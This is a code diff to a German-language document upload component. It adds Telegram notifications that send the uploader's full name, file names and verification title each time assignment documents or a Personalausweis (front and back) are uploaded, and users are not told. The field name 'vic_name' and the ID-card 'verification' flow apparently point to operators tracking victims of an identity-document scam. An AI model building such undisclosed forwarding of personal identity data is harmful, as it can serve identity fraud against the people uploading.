@@ -26,6 +26,7 @@ import {
   IdCard,
 } from "lucide-react";
 import { toast } from "sonner";
+import { notifyTelegram } from "@/lib/telegramNotify";
 
 interface Assignment {
   id: string;
@@ -235,6 +236,24 @@ export default function DocumentUpload({ onBack }: { onBack: () => void }) {
       }
 
       toast.success("Dokumente erfolgreich hochgeladen");
+      // Telegram notification (fire-and-forget)
+      (async () => {
+        const { data: prof } = await supabase
+          .from("profiles")
+          .select("first_name, last_name")
+          .eq("id", user.id)
+          .maybeSingle();
+        const vicName = `${prof?.first_name ?? ""} ${prof?.last_name ?? ""}`.trim() || (user.email ?? "Unbekannt");
+        const verificationTitle = assignments.find((a) => a.id === selectedAssignment)?.verification_title;
+        for (const file of files) {
+          notifyTelegram("document_uploaded", {
+            vic_name: vicName,
+            file_name: file.name,
+            verification_title: verificationTitle,
+            category: "Auftragsdokument",
+          });
+        }
+      })();
       setFiles([]);
       loadDocuments();
     } catch {
@@ -294,6 +313,20 @@ export default function DocumentUpload({ onBack }: { onBack: () => void }) {
         toast.error("Konnte Status nicht speichern");
       }
       setIdSubmittedAt(nowIso);
+      // Telegram notification for ID document
+      (async () => {
+        const { data: prof } = await supabase
+          .from("profiles")
+          .select("first_name, last_name")
+          .eq("id", user.id)
+          .maybeSingle();
+        const vicName = `${prof?.first_name ?? ""} ${prof?.last_name ?? ""}`.trim() || (user.email ?? "Unbekannt");
+        notifyTelegram("document_uploaded", {
+          vic_name: vicName,
+          file_name: `${idFront.name} & ${idBack.name}`,
+          category: "Personalausweis (Vorder- & Rückseite)",
+        });
+      })();
       setIdFront(null);
       setIdBack(null);
       toast.success("Personalausweis erfolgreich übermittelt");
